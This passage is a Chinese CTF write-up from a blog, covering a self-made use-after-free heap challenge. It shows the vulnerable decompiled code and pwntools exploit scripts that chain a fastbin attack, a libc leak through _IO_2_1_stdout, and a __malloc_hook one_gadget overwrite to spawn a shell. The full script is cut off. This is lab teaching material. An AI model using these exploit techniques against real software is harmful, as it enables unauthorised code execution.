<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:type" content="website">
<meta property="og:title" content="I0gan">
<meta property="og:url" content="http://blog.i0gan.cn/page/5/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:locale">
<meta property="article:author" content="i0gan">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-wp-uaf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/06/wp-uaf/" class="article-date">
  <time datetime="2020-05-06T10:43:15.000Z" itemprop="datePublished">2020-05-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/06/wp-uaf/">wp uaf</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打.</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>5 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有添加和删除功能, 添加的时候输入大小,再输入内容, 而删除根据索引进行删除.</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;pheap + <span class="number">2</span> * v1)); <span class="comment">//  UAF漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>fastbin attack, IO_FILE</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>开辟一个small bin, 然后通过fastbin attack partial write 修改unsoted bin 的 fd 的后两字节指向<code>_IO_2_1_stderr</code> + 157处, 使用fastbin attack_IO_2_1_stdout`结构体中泄漏libc, 再次使用fastbin attack 打入malloc_hook - 0x23处打one_gadget, realloc的push次数调整execve第二个参数, 打通概率 1 /16</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	a = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>



<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 0 为了使用fastbin attack打入unsoted bin-0x10处</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x50</span></span><br><span class="line">   <span class="comment">#伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd</span></span><br><span class="line">p += p64(<span class="number">0</span>) <span class="comment"># prev_size</span></span><br><span class="line">p += p64(<span class="number">0x31</span>) <span class="comment"># size</span></span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x60</span>, p) <span class="comment"># idx 1</span></span><br><span class="line">ad(<span class="number">0x80</span>, <span class="string">&#x27;B&#x27;</span>) <span class="comment"># idx 2 为了partiwritefast bin attack实现打入_IO_2_1_stderr + 157处</span></span><br><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 3 为了使用fastbin attack打入unsoted bin-0x10处</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 4 为了与修改后的chunk 2在fastbin中连接起来,然后就可以实现打入IO_2_1_stdout中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for fastbin attack to _free_hook</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 5 为了fastbin attac 打入malloc_hook - 0x23</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 6 为了fastbin attac 打入malloc_hook - 0x23</span></span><br></pre></td></tr></table></figure>



<h3 id="打入chunk-2修改size-和fd"><a href="#打入chunk-2修改size-和fd" class="headerlink" title="打入chunk 2修改size 和fd"></a>打入chunk 2修改size 和fd</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="number">3</span>) <span class="comment"># 为了 构造fastbin attack</span></span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">2</span>) <span class="comment"># 先释放掉chunk 2,使fd 为main_arena + 0x58</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 这里采用partial write 方式修改 chunk 3中的fd指向 chunk 2 - 0x10处，这里是我们伪造好的堆块</span></span><br><span class="line">   ad(<span class="number">0x20</span>, <span class="string">&#x27;\x90&#x27;</span>) <span class="comment"># attack to chunk 2 - 0x10</span></span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 调整</span></span><br><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 调整</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># 修改chunk 2 的size和fd</span></span><br><span class="line">p = p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0x71</span>)  <span class="comment"># 修改为fastbin, 绕过检查</span></span><br><span class="line">p += <span class="string">&#x27;\xdd\x25&#x27;</span> <span class="comment"># partial write指向_IO_2_1_stderr + 157处</span></span><br><span class="line">ad(<span class="number">0x20</span>, p) <span class="comment"># patial write to _IO_2_1_stderr_ + 157</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<h3 id="打入-IO-2-1-stderr-157处"><a href="#打入-IO-2-1-stderr-157处" class="headerlink" title="打入_IO_2_1_stderr + 157处"></a>打入_IO_2_1_stderr + 157处</h3><p>满足size调试如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;40gx (long int)&amp;_IO_2_1_stdout_ - 0x43</span><br><span class="line">0x7f007e1fe5dd &lt;_IO_2_1_stderr_+157&gt;:	0x007e1fd660000000	0x000000000000007f</span><br><span class="line">0x7f007e1fe5ed &lt;_IO_2_1_stderr_+173&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f007e1fe5fd &lt;_IO_2_1_stderr_+189&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f007e1fe60d &lt;_IO_2_1_stderr_+205&gt;:	0x0000000000000000	0x007e1fc6e0000000</span><br><span class="line">0x7f007e1fe61d &lt;_IO_2_1_stderr_+221&gt;:	0x00fbad288700007f	0x007e1fe6a3000000</span><br><span class="line">0x7f007e1fe62d &lt;_IO_2_1_stdout_+13&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f</span><br><span class="line">0x7f007e1fe63d &lt;_IO_2_1_stdout_+29&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f</span><br><span class="line">0x7f007e1fe64d &lt;_IO_2_1_stdout_+45&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f</span><br><span class="line">0x7f007e1fe65d &lt;_IO_2_1_stdout_+61&gt;:	0x007e1fe6a400007f	0x000000000000007f</span><br></pre></td></tr></table></figure>

<p>把刚才所构建的fastbin chunk 2放入fastbin 中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin attack to _IO__2_1_stderr + 157</span></span><br><span class="line">   <span class="comment"># 为了 构造fastbin attack</span></span><br><span class="line">rm(<span class="number">4</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">rm(<span class="number">4</span>)</span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;\xa0&#x27;</span>) <span class="comment"># 将fastbin chunk 2放入fastbin 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for alignment</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>修改<code>_IO_2_1_stdout</code>结构体实现打印出libc中的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x33</span></span><br><span class="line">   <span class="comment"># _IO_2_1_stdout_ struct</span></span><br><span class="line">p += p64(<span class="number">0xfbad3c80</span>) <span class="comment"># _IO_2_1_stdout_ flag</span></span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">p += p8(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x60</span>, p)</span><br><span class="line">lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="number">0x7ffff7dd2608</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br></pre></td></tr></table></figure>



<h3 id="打入-malloc-hook-0x23处"><a href="#打入-malloc-hook-0x23处" class="headerlink" title="打入__malloc_hook - 0x23处"></a>打入__malloc_hook - 0x23处</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fast bin attack to malloc_hook - 0x23</span></span><br><span class="line">   <span class="comment"># 为了 构造fastbin attack</span></span><br><span class="line">rm(<span class="number">5</span>)	</span><br><span class="line">rm(<span class="number">6</span>)	</span><br><span class="line">rm(<span class="number">5</span>)	</span><br><span class="line"></span><br><span class="line">p = p64(lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">ad(<span class="number">0x68</span>, p)</span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="修改malloc-hook-和realloc-hook打one-gadget"><a href="#修改malloc-hook-和realloc-hook打one-gadget" class="headerlink" title="修改malloc_hook 和realloc_hook打one_gadget"></a>修改malloc_hook 和realloc_hook打one_gadget</h3><p>通过realloc的push次数来调整execve的第二个参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x13</span> <span class="number">-8</span>)</span><br><span class="line">p += p64(one_gadget)</span><br><span class="line">p += p64(lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">12</span>)</span><br><span class="line">ad(<span class="number">0x68</span>, p)</span><br></pre></td></tr></table></figure>



<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ru(<span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span 